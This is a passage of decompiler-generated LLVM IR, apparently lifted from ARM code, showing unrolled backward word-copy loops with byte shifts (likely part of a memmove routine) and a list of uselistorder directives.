  store i32 %v6_176b0, i32* %r4.global-to-local, align 4
  %v7_176b0 = add i32 %v0_176b0, -12
  %v8_176b0 = inttoptr i32 %v7_176b0 to i32*
  %v9_176b0 = load i32, i32* %v8_176b0, align 4
  store i32 %v9_176b0, i32* %r5.global-to-local, align 4
  %v10_176b0 = add i32 %v0_176b0, -16
  %v11_176b0 = inttoptr i32 %v10_176b0 to i32*
  %v12_176b0 = load i32, i32* %v11_176b0, align 4
  store i32 %v10_176b0, i32* %r1.global-to-local, align 4
  %v4_176b4 = udiv i32 %v12_176b0, 16777216
  %v5_176b4 = or i32 %v4_176b4, %v3_176ac
  store i32 %v5_176b4, i32* %lr.global-to-local, align 4
  %v3_176b8 = mul i32 %v12_176b0, 256
  %v4_176bc = udiv i32 %v9_176b0, 16777216
  %v5_176bc = or i32 %v3_176b8, %v4_176bc
  store i32 %v5_176bc, i32* @ip, align 4
  %v3_176c0 = mul i32 %v9_176b0, 256
  %v4_176c4 = udiv i32 %v6_176b0, 16777216
  %v5_176c4 = or i32 %v3_176c0, %v4_176c4
  store i32 %v5_176c4, i32* %r5.global-to-local, align 4
  %v3_176c8 = mul i32 %v6_176b0, 256
  %v4_176cc = udiv i32 %v3_176b0, 16777216
  %v5_176cc = or i32 %v3_176c8, %v4_176cc
  store i32 %v5_176cc, i32* %r4.global-to-local, align 4
  %v1_176d0 = add i32 %v0_176d0, -16
  %v2_176d0 = inttoptr i32 %v1_176d0 to i32*
  store i32 %v5_176cc, i32* %v2_176d0, align 4
  %v4_176d0 = add i32 %v0_176d0, -12
  %v5_176d0 = inttoptr i32 %v4_176d0 to i32*
  %v6_176d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_176d0, i32* %v5_176d0, align 4
  %v7_176d0 = add i32 %v0_176d0, -8
  %v8_176d0 = inttoptr i32 %v7_176d0 to i32*
  %v9_176d0 = load i32, i32* @ip, align 4
  store i32 %v9_176d0, i32* %v8_176d0, align 4
  %v10_176d0 = add i32 %v0_176d0, -4
  %v11_176d0 = inttoptr i32 %v10_176d0 to i32*
  %v12_176d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_176d0, i32* %v11_176d0, align 4
  store i32 %v1_176d0, i32* %r0.global-to-local, align 4
  %v0_176d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_176d4 = add i32 %v0_176d4, -16
  store i32 %v2_176d4, i32* %r2.global-to-local, align 4
  %v6_176d8 = icmp slt i32 %v0_176d4, 16
  br i1 %v6_176d8, label %dec_label_pc_176dc, label %dec_label_pc_176ac.dec_label_pc_176ac_crit_edge

dec_label_pc_176ac.dec_label_pc_176ac_crit_edge:  ; preds = %dec_label_pc_176ac
  %v0_176ac.pre = load i32, i32* @r3, align 4
  %v0_176b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_176ac

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176ac
  %v2_176dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_176dc, i32* @r4, align 4
  %v5_176dc = load i8*, i8** %stack_var_-8, align 4
  %v6_176dc = ptrtoint i8* %v5_176dc to i32
  store i32 %v6_176dc, i32* @r5, align 4
  store i32 %v11_176a8, i32* @lr, align 4
  %v2_176e0 = add i32 %v0_176d4, -4
  store i32 %v2_176e0, i32* %r2.global-to-local, align 4
  %v4_176e0 = add i32 %v0_176d4, 2147483632
  %v5_176e0 = and i32 %v2_176e0, %v4_176e0
  %v6_176e0 = icmp slt i32 %v5_176e0, 0
  store i1 %v6_176e0, i1* %cpsr_v.global-to-local, align 1
  %v7_176e0 = icmp slt i32 %v2_176e0, 0
  store i1 %v7_176e0, i1* %cpsr_n.global-to-local, align 1
  %v8_176e0 = icmp eq i32 %v2_176e0, 0
  store i1 %v8_176e0, i1* %cpsr_z.global-to-local, align 1
  %v5_176e4 = icmp slt i32 %v2_176d4, -12
  br i1 %v5_176e4, label %dec_label_pc_17700, label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_176dc, %dec_label_pc_1769c, %dec_label_pc_176e8
  %v1_176f4 = phi i32 [ %v5_176f4, %dec_label_pc_176e8 ], [ %v1_176d0, %dec_label_pc_176dc ], [ %v0_176d019, %dec_label_pc_1769c ]
  %v0_176e8 = load i32, i32* @r3, align 4
  %v3_176e8 = mul i32 %v0_176e8, 256
  store i32 %v3_176e8, i32* %ip.global-to-local, align 4
  %v0_176ec = load i32, i32* %r1.global-to-local, align 4
  %v1_176ec = add i32 %v0_176ec, -4
  %v2_176ec = inttoptr i32 %v1_176ec to i32*
  %v3_176ec = load i32, i32* %v2_176ec, align 4
  store i32 %v3_176ec, i32* @r3, align 4
  store i32 %v1_176ec, i32* %r1.global-to-local, align 4
  %v4_176f0 = udiv i32 %v3_176ec, 16777216
  %v5_176f0 = or i32 %v4_176f0, %v3_176e8
  store i32 %v5_176f0, i32* @ip, align 4
  %v2_176f4 = add i32 %v1_176f4, -4
  %v3_176f4 = inttoptr i32 %v2_176f4 to i32*
  store i32 %v5_176f0, i32* %v3_176f4, align 4
  %v4_176f4 = load i32, i32* %r0.global-to-local, align 4
  %v5_176f4 = add i32 %v4_176f4, -4
  store i32 %v5_176f4, i32* %r0.global-to-local, align 4
  %v0_176f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_176f8 = add i32 %v0_176f8, -4
  store i32 %v2_176f8, i32* %r2.global-to-local, align 4
  %v6_176fc = icmp slt i32 %v0_176f8, 4
  br i1 %v6_176fc, label %dec_label_pc_17700.loopexit, label %dec_label_pc_176e8

dec_label_pc_17700.loopexit:                      ; preds = %dec_label_pc_176e8
  %v4_176f8 = sub i32 3, %v0_176f8
  %v5_176f8 = and i32 %v4_176f8, %v0_176f8
  %v6_176f8 = icmp slt i32 %v5_176f8, 0
  %v7_176f8 = icmp slt i32 %v2_176f8, 0
  store i1 %v6_176f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_176f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17700

dec_label_pc_17700:                               ; preds = %dec_label_pc_17700.loopexit, %dec_label_pc_176dc
  %v2_1764451 = phi i32 [ %v5_176f4, %dec_label_pc_17700.loopexit ], [ %v1_176d0, %dec_label_pc_176dc ]
  %v0_1763447 = phi i32 [ %v2_176f8, %dec_label_pc_17700.loopexit ], [ %v2_176e0, %dec_label_pc_176dc ]
  %v0_17700 = load i32, i32* %r1.global-to-local, align 4
  %v1_17700 = add i32 %v0_17700, 3
  store i32 %v1_17700, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17708:                               ; preds = %dec_label_pc_17698
  br i1 %v5_17778, label %dec_label_pc_17754, label %dec_label_pc_17710

dec_label_pc_17710:                               ; preds = %dec_label_pc_17708
  store i32 %v2_17774, i32* %r2.global-to-local, align 4
  %v3_17714 = load i32, i32* @r4, align 4
  store i32 %v3_17714, i32* %stack_var_-12, align 4
  %v6_17714 = load i32, i32* @r5, align 4
  %v8_17714 = inttoptr i32 %v6_17714 to i8*
  store i8* %v8_17714, i8** %stack_var_-8, align 4
  %v11_17714 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17718

dec_label_pc_17718:                               ; preds = %dec_label_pc_17718.dec_label_pc_17718_crit_edge, %dec_label_pc_17710
  %v0_1773c = phi i32 [ %v1_1773c, %dec_label_pc_17718.dec_label_pc_17718_crit_edge ], [ %v0_176d019, %dec_label_pc_17710 ]
  %v0_1771c = phi i32 [ %v0_1771c.pre, %dec_label_pc_17718.dec_label_pc_17718_crit_edge ], [ %v1_17688, %dec_label_pc_17710 ]
  %v0_17718 = phi i32 [ %v0_17718.pre, %dec_label_pc_17718.dec_label_pc_17718_crit_edge ], [ %v2_1768c, %dec_label_pc_17710 ]
  %v3_17718 = mul i32 %v0_17718, 65536
  store i32 %v3_17718, i32* %lr.global-to-local, align 4
  %v1_1771c = add i32 %v0_1771c, -4
  %v2_1771c = inttoptr i32 %v1_1771c to i32*
  %v3_1771c = load i32, i32* %v2_1771c, align 4
  store i32 %v3_1771c, i32* @r3, align 4
  %v4_1771c = add i32 %v0_1771c, -8
  %v5_1771c = inttoptr i32 %v4_1771c to i32*
  %v6_1771c = load i32, i32* %v5_1771c, align 4
  store i32 %v6_1771c, i32* %r4.global-to-local, align 4
  %v7_1771c = add i32 %v0_1771c, -12
  %v8_1771c = inttoptr i32 %v7_1771c to i32*
  %v9_1771c = load i32, i32* %v8_1771c, align 4
  store i32 %v9_1771c, i32* %r5.global-to-local, align 4
  %v10_1771c = add i32 %v0_1771c, -16
  %v11_1771c = inttoptr i32 %v10_1771c to i32*
  %v12_1771c = load i32, i32* %v11_1771c, align 4
  store i32 %v10_1771c, i32* %r1.global-to-local, align 4
  %v4_17720 = udiv i32 %v12_1771c, 65536
  %v5_17720 = or i32 %v4_17720, %v3_17718
  store i32 %v5_17720, i32* %lr.global-to-local, align 4
  %v3_17724 = mul i32 %v12_1771c, 65536
  %v4_17728 = udiv i32 %v9_1771c, 65536
  %v5_17728 = or i32 %v3_17724, %v4_17728
  store i32 %v5_17728, i32* @ip, align 4
  %v3_1772c = mul i32 %v9_1771c, 65536
  %v4_17730 = udiv i32 %v6_1771c, 65536
  %v5_17730 = or i32 %v3_1772c, %v4_17730
  store i32 %v5_17730, i32* %r5.global-to-local, align 4
  %v3_17734 = mul i32 %v6_1771c, 65536
  %v4_17738 = udiv i32 %v3_1771c, 65536
  %v5_17738 = or i32 %v3_17734, %v4_17738
  store i32 %v5_17738, i32* %r4.global-to-local, align 4
  %v1_1773c = add i32 %v0_1773c, -16
  %v2_1773c = inttoptr i32 %v1_1773c to i32*
  store i32 %v5_17738, i32* %v2_1773c, align 4
  %v4_1773c = add i32 %v0_1773c, -12
  %v5_1773c = inttoptr i32 %v4_1773c to i32*
  %v6_1773c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1773c, i32* %v5_1773c, align 4
  %v7_1773c = add i32 %v0_1773c, -8
  %v8_1773c = inttoptr i32 %v7_1773c to i32*
  %v9_1773c = load i32, i32* @ip, align 4
  store i32 %v9_1773c, i32* %v8_1773c, align 4
  %v10_1773c = add i32 %v0_1773c, -4
  %v11_1773c = inttoptr i32 %v10_1773c to i32*
  %v12_1773c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1773c, i32* %v11_1773c, align 4
  store i32 %v1_1773c, i32* %r0.global-to-local, align 4
  %v0_17740 = load i32, i32* %r2.global-to-local, align 4
  %v2_17740 = add i32 %v0_17740, -16
  store i32 %v2_17740, i32* %r2.global-to-local, align 4
  %v6_17744 = icmp slt i32 %v0_17740, 16
  br i1 %v6_17744, label %dec_label_pc_17748, label %dec_label_pc_17718.dec_label_pc_17718_crit_edge

dec_label_pc_17718.dec_label_pc_17718_crit_edge:  ; preds = %dec_label_pc_17718
  %v0_17718.pre = load i32, i32* @r3, align 4
  %v0_1771c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17718

dec_label_pc_17748:                               ; preds = %dec_label_pc_17718
  %v2_17748 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17748, i32* @r4, align 4
  %v5_17748 = load i8*, i8** %stack_var_-8, align 4
  %v6_17748 = ptrtoint i8* %v5_17748 to i32
  store i32 %v6_17748, i32* @r5, align 4
  store i32 %v11_17714, i32* @lr, align 4
  %v2_1774c = add i32 %v0_17740, -4
  store i32 %v2_1774c, i32* %r2.global-to-local, align 4
  %v4_1774c = add i32 %v0_17740, 2147483632
  %v5_1774c = and i32 %v2_1774c, %v4_1774c
  %v6_1774c = icmp slt i32 %v5_1774c, 0
  store i1 %v6_1774c, i1* %cpsr_v.global-to-local, align 1
  %v7_1774c = icmp slt i32 %v2_1774c, 0
  store i1 %v7_1774c, i1* %cpsr_n.global-to-local, align 1
  %v8_1774c = icmp eq i32 %v2_1774c, 0
  store i1 %v8_1774c, i1* %cpsr_z.global-to-local, align 1
  %v5_17750 = icmp slt i32 %v2_17740, -12
  br i1 %v5_17750, label %dec_label_pc_1776c, label %dec_label_pc_17754

dec_label_pc_17754:                               ; preds = %dec_label_pc_17748, %dec_label_pc_17708, %dec_label_pc_17754
  %v1_17760 = phi i32 [ %v5_17760, %dec_label_pc_17754 ], [ %v1_1773c, %dec_label_pc_17748 ], [ %v0_176d019, %dec_label_pc_17708 ]
  %v0_17754 = load i32, i32* @r3, align 4
  %v3_17754 = mul i32 %v0_17754, 65536
  store i32 %v3_17754, i32* %ip.global-to-local, align 4
  %v0_17758 = load i32, i32* %r1.global-to-local, align 4
  %v1_17758 = add i32 %v0_17758, -4
  %v2_17758 = inttoptr i32 %v1_17758 to i32*
  %v3_17758 = load i32, i32* %v2_17758, align 4
  store i32 %v3_17758, i32* @r3, align 4
  store i32 %v1_17758, i32* %r1.global-to-local, align 4
  %v4_1775c = udiv i32 %v3_17758, 65536
  %v5_1775c = or i32 %v4_1775c, %v3_17754
  store i32 %v5_1775c, i32* @ip, align 4
  %v2_17760 = add i32 %v1_17760, -4
  %v3_17760 = inttoptr i32 %v2_17760 to i32*
  store i32 %v5_1775c, i32* %v3_17760, align 4
  %v4_17760 = load i32, i32* %r0.global-to-local, align 4
  %v5_17760 = add i32 %v4_17760, -4
  store i32 %v5_17760, i32* %r0.global-to-local, align 4
  %v0_17764 = load i32, i32* %r2.global-to-local, align 4
  %v2_17764 = add i32 %v0_17764, -4
  store i32 %v2_17764, i32* %r2.global-to-local, align 4
  %v6_17768 = icmp slt i32 %v0_17764, 4
  br i1 %v6_17768, label %dec_label_pc_1776c.loopexit, label %dec_label_pc_17754

dec_label_pc_1776c.loopexit:                      ; preds = %dec_label_pc_17754
  %v4_17764 = sub i32 3, %v0_17764
  %v5_17764 = and i32 %v4_17764, %v0_17764
  %v6_17764 = icmp slt i32 %v5_17764, 0
  %v7_17764 = icmp slt i32 %v2_17764, 0
  store i1 %v6_17764, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17764, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %dec_label_pc_1776c.loopexit, %dec_label_pc_17748
  %v2_1764452 = phi i32 [ %v5_17760, %dec_label_pc_1776c.loopexit ], [ %v1_1773c, %dec_label_pc_17748 ]
  %v0_1763448 = phi i32 [ %v2_17764, %dec_label_pc_1776c.loopexit ], [ %v2_1774c, %dec_label_pc_17748 ]
  %v0_1776c = load i32, i32* %r1.global-to-local, align 4
  %v1_1776c = add i32 %v0_1776c, 2
  store i32 %v1_1776c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17774:                               ; preds = %dec_label_pc_17688
  br i1 %v5_17778, label %dec_label_pc_177c0, label %dec_label_pc_1777c

dec_label_pc_1777c:                               ; preds = %dec_label_pc_17774
  store i32 %v2_17774, i32* %r2.global-to-local, align 4
  %v3_17780 = load i32, i32* @r4, align 4
  store i32 %v3_17780, i32* %stack_var_-12, align 4
  %v6_17780 = load i32, i32* @r5, align 4
  %v8_17780 = inttoptr i32 %v6_17780 to i8*
  store i8* %v8_17780, i8** %stack_var_-8, align 4
  %v11_17780 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17784

dec_label_pc_17784:                               ; preds = %dec_label_pc_17784.dec_label_pc_17784_crit_edge, %dec_label_pc_1777c
  %v0_177a8 = phi i32 [ %v1_177a8, %dec_label_pc_17784.dec_label_pc_17784_crit_edge ], [ %v0_176d019, %dec_label_pc_1777c ]
  %v0_17788 = phi i32 [ %v0_17788.pre, %dec_label_pc_17784.dec_label_pc_17784_crit_edge ], [ %v1_17688, %dec_label_pc_1777c ]
  %v0_17784 = phi i32 [ %v0_17784.pre, %dec_label_pc_17784.dec_label_pc_17784_crit_edge ], [ %v2_1768c, %dec_label_pc_1777c ]
  %v3_17784 = mul i32 %v0_17784, 16777216
  store i32 %v3_17784, i32* %lr.global-to-local, align 4
  %v1_17788 = add i32 %v0_17788, -4
  %v2_17788 = inttoptr i32 %v1_17788 to i32*
  %v3_17788 = load i32, i32* %v2_17788, align 4
  store i32 %v3_17788, i32* @r3, align 4
  %v4_17788 = add i32 %v0_17788, -8
  %v5_17788 = inttoptr i32 %v4_17788 to i32*
  %v6_17788 = load i32, i32* %v5_17788, align 4
  store i32 %v6_17788, i32* %r4.global-to-local, align 4
  %v7_17788 = add i32 %v0_17788, -12
  %v8_17788 = inttoptr i32 %v7_17788 to i32*
  %v9_17788 = load i32, i32* %v8_17788, align 4
  store i32 %v9_17788, i32* %r5.global-to-local, align 4
  %v10_17788 = add i32 %v0_17788, -16
  %v11_17788 = inttoptr i32 %v10_17788 to i32*
  %v12_17788 = load i32, i32* %v11_17788, align 4
  store i32 %v10_17788, i32* %r1.global-to-local, align 4
  %v4_1778c = udiv i32 %v12_17788, 256
  %v5_1778c = or i32 %v4_1778c, %v3_17784
  store i32 %v5_1778c, i32* %lr.global-to-local, align 4
  %v3_17790 = mul i32 %v12_17788, 16777216
  %v4_17794 = udiv i32 %v9_17788, 256
  %v5_17794 = or i32 %v3_17790, %v4_17794
  store i32 %v5_17794, i32* @ip, align 4
  %v3_17798 = mul i32 %v9_17788, 16777216
  %v4_1779c = udiv i32 %v6_17788, 256
  %v5_1779c = or i32 %v3_17798, %v4_1779c
  store i32 %v5_1779c, i32* %r5.global-to-local, align 4
  %v3_177a0 = mul i32 %v6_17788, 16777216
  %v4_177a4 = udiv i32 %v3_17788, 256
  %v5_177a4 = or i32 %v3_177a0, %v4_177a4
  store i32 %v5_177a4, i32* %r4.global-to-local, align 4
  %v1_177a8 = add i32 %v0_177a8, -16
  %v2_177a8 = inttoptr i32 %v1_177a8 to i32*
  store i32 %v5_177a4, i32* %v2_177a8, align 4
  %v4_177a8 = add i32 %v0_177a8, -12
  %v5_177a8 = inttoptr i32 %v4_177a8 to i32*
  %v6_177a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_177a8, i32* %v5_177a8, align 4
  %v7_177a8 = add i32 %v0_177a8, -8
  %v8_177a8 = inttoptr i32 %v7_177a8 to i32*
  %v9_177a8 = load i32, i32* @ip, align 4
  store i32 %v9_177a8, i32* %v8_177a8, align 4
  %v10_177a8 = add i32 %v0_177a8, -4
  %v11_177a8 = inttoptr i32 %v10_177a8 to i32*
  %v12_177a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_177a8, i32* %v11_177a8, align 4
  store i32 %v1_177a8, i32* %r0.global-to-local, align 4
  %v0_177ac = load i32, i32* %r2.global-to-local, align 4
  %v2_177ac = add i32 %v0_177ac, -16
  store i32 %v2_177ac, i32* %r2.global-to-local, align 4
  %v6_177b0 = icmp slt i32 %v0_177ac, 16
  br i1 %v6_177b0, label %dec_label_pc_177b4, label %dec_label_pc_17784.dec_label_pc_17784_crit_edge

dec_label_pc_17784.dec_label_pc_17784_crit_edge:  ; preds = %dec_label_pc_17784
  %v0_17784.pre = load i32, i32* @r3, align 4
  %v0_17788.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17784

dec_label_pc_177b4:                               ; preds = %dec_label_pc_17784
  %v2_177b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_177b4, i32* @r4, align 4
  %v5_177b4 = load i8*, i8** %stack_var_-8, align 4
  %v6_177b4 = ptrtoint i8* %v5_177b4 to i32
  store i32 %v6_177b4, i32* @r5, align 4
  store i32 %v11_17780, i32* @lr, align 4
  %v2_177b8 = add i32 %v0_177ac, -4
  store i32 %v2_177b8, i32* %r2.global-to-local, align 4
  %v4_177b8 = add i32 %v0_177ac, 2147483632
  %v5_177b8 = and i32 %v2_177b8, %v4_177b8
  %v6_177b8 = icmp slt i32 %v5_177b8, 0
  store i1 %v6_177b8, i1* %cpsr_v.global-to-local, align 1
  %v7_177b8 = icmp slt i32 %v2_177b8, 0
  store i1 %v7_177b8, i1* %cpsr_n.global-to-local, align 1
  %v8_177b8 = icmp eq i32 %v2_177b8, 0
  store i1 %v8_177b8, i1* %cpsr_z.global-to-local, align 1
  %v5_177bc = icmp slt i32 %v2_177ac, -12
  br i1 %v5_177bc, label %dec_label_pc_177d8, label %dec_label_pc_177c0

dec_label_pc_177c0:                               ; preds = %dec_label_pc_177b4, %dec_label_pc_17774, %dec_label_pc_177c0
  %v1_177cc = phi i32 [ %v5_177cc, %dec_label_pc_177c0 ], [ %v1_177a8, %dec_label_pc_177b4 ], [ %v0_176d019, %dec_label_pc_17774 ]
  %v0_177c0 = load i32, i32* @r3, align 4
  %v3_177c0 = mul i32 %v0_177c0, 16777216
  store i32 %v3_177c0, i32* %ip.global-to-local, align 4
  %v0_177c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_177c4 = add i32 %v0_177c4, -4
  %v2_177c4 = inttoptr i32 %v1_177c4 to i32*
  %v3_177c4 = load i32, i32* %v2_177c4, align 4
  store i32 %v3_177c4, i32* @r3, align 4
  store i32 %v1_177c4, i32* %r1.global-to-local, align 4
  %v4_177c8 = udiv i32 %v3_177c4, 256
  %v5_177c8 = or i32 %v4_177c8, %v3_177c0
  store i32 %v5_177c8, i32* @ip, align 4
  %v2_177cc = add i32 %v1_177cc, -4
  %v3_177cc = inttoptr i32 %v2_177cc to i32*
  store i32 %v5_177c8, i32* %v3_177cc, align 4
  %v4_177cc = load i32, i32* %r0.global-to-local, align 4
  %v5_177cc = add i32 %v4_177cc, -4
  store i32 %v5_177cc, i32* %r0.global-to-local, align 4
  %v0_177d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_177d0 = add i32 %v0_177d0, -4
  store i32 %v2_177d0, i32* %r2.global-to-local, align 4
  %v6_177d4 = icmp slt i32 %v0_177d0, 4
  br i1 %v6_177d4, label %dec_label_pc_177d8.loopexit, label %dec_label_pc_177c0

dec_label_pc_177d8.loopexit:                      ; preds = %dec_label_pc_177c0
  %v4_177d0 = sub i32 3, %v0_177d0
  %v5_177d0 = and i32 %v4_177d0, %v0_177d0
  %v6_177d0 = icmp slt i32 %v5_177d0, 0
  %v7_177d0 = icmp slt i32 %v2_177d0, 0
  store i1 %v6_177d0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_177d0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_177d8

dec_label_pc_177d8:                               ; preds = %dec_label_pc_177d8.loopexit, %dec_label_pc_177b4
  %v2_1764453 = phi i32 [ %v5_177cc, %dec_label_pc_177d8.loopexit ], [ %v1_177a8, %dec_label_pc_177b4 ]
  %v0_1763449 = phi i32 [ %v2_177d0, %dec_label_pc_177d8.loopexit ], [ %v2_177b8, %dec_label_pc_177b4 ]
  %v0_177d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_177d8 = add i32 %v0_177d8, 1
  store i32 %v1_177d8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_177cc, { 0, 2, 1 }
  uselistorder i32 %v3_177c0, { 1, 0 }
  uselistorder i32 %v2_177b8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_177a8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17788, { 1, 0 }
  uselistorder i32 %v3_17784, { 1, 0 }
  uselistorder i32 %v0_17788, { 3, 2, 1, 0 }
  uselistorder i32 %v0_177a8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17760, { 0, 2, 1 }
  uselistorder i32 %v3_17754, { 1, 0 }
  uselistorder i32 %v2_1774c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1773c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1771c, { 1, 0 }
  uselistorder i32 %v3_17718, { 1, 0 }
  uselistorder i32 %v0_1771c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1773c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_176f4, { 0, 2, 1 }
  uselistorder i32 %v3_176e8, { 1, 0 }
  uselistorder i32 %v2_176e0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_176d0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_176b0, { 1, 0 }
  uselistorder i32 %v3_176ac, { 1, 0 }
  uselistorder i32 %v0_176b0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_176d0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17778, { 2, 0, 1 }
  uselistorder i32 %v0_17690, { 1, 0 }
  uselistorder i32 %v0_1777c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_176d019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17680, { 2, 1, 0 }
  uselistorder i32 %v0_17680, { 2, 0, 1 }
  uselistorder i32 %v2_17678, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17678, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17678, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_176d020, { 2, 1, 0 }
  uselistorder i32 %v11_17654, { 1, 0 }
  uselistorder i32 %v7_17654, { 1, 0 }
  uselistorder i32 %v1_17634, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_17634, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17638, { 1, 0 }
  uselistorder i32 %v7_1762c, { 0, 2, 1 }
  uselistorder i32 %v10_17628, { 1, 0 }
  uselistorder i32 %v9_17620, { 1, 0, 2 }
  uselistorder i32 %v6_1761c, { 1, 0 }
  uselistorder i32 %v2_17614, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_17614, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_17624, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17608, { 0, 2, 1 }
  uselistorder i32 %v13_17604, { 1, 0 }
  uselistorder i32 %v4_17600, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17600, { 2, 0, 1 }
  uselistorder i32 %v6_17608, { 0, 3, 2, 1 }
  uselistorder i32 %v7_175f8, { 0, 2, 1 }
  uselistorder i32 %v16_175f4, { 1, 0 }
  uselistorder i32 %v4_175f0, { 1, 2, 0 }
  uselistorder i32 %v0_17600.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_175f8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_175e4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_175e0, { 1, 0 }
  uselistorder i32 %v1_175dc, { 1, 0 }
  uselistorder i32 %v10_175d8, { 1, 0 }
  uselistorder i32 %v0_175d8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_175dc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_175d0, { 0, 2, 1 }
  uselistorder i32 %v2_175c4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_175c4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_175dc37, { 1, 2, 0 }
  uselistorder i32 %v1_175bc, { 2, 1, 0 }
  uselistorder i32 %v1_175b4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_175ac, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_175a8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_175a4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_175a4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_17594, { 0, 2, 1 }
  uselistorder i32 %v4_17590, { 1, 0 }
  uselistorder i32 %v3_17584, { 1, 0 }
  uselistorder i32 %v1_1757c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17570, { 1, 0 }
  uselistorder i32 %v12_1756c, { 0, 2, 1 }
  uselistorder i32 %v8_1754c, { 1, 0, 2 }
  uselistorder i32 %v5_1754c, { 1, 0, 2 }
  uselistorder i32 %v2_1754c, { 1, 0, 2 }
  uselistorder i32 %v0_1754c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1756c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17528, { 0, 2, 1 }
  uselistorder i32 %v4_17524, { 1, 0 }
  uselistorder i32 %v3_17518, { 1, 0 }
  uselistorder i32 %v1_17510, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17504, { 1, 0 }
  uselistorder i32 %v12_17500, { 0, 2, 1 }
  uselistorder i32 %v8_174e0, { 1, 0, 2 }
  uselistorder i32 %v5_174e0, { 1, 0, 2 }
  uselistorder i32 %v2_174e0, { 1, 0, 2 }
  uselistorder i32 %v0_174e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17500, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_174bc, { 0, 2, 1 }
  uselistorder i32 %v4_174b8, { 1, 0 }
  uselistorder i32 %v3_174ac, { 1, 0 }
  uselistorder i32 %v1_174a4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17498, { 1, 0 }
  uselistorder i32 %v12_17494, { 0, 2, 1 }
  uselistorder i32 %v8_17474, { 1, 0, 2 }
  uselistorder i32 %v5_17474, { 1, 0, 2 }
  uselistorder i32 %v2_17474, { 1, 0, 2 }
  uselistorder i32 %v0_17474, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17494, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_174d0, { 0, 2, 1 }
  uselistorder i32 %v1_174cc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_17450, { 2, 0, 1, 3 }
  uselistorder i32 %v2_17450, { 2, 0, 1, 3 }
  uselistorder i32 %v0_174d4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1756c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_17444, { 1, 0 }
  uselistorder i32 %v0_17444, { 3, 1, 0, 2 }
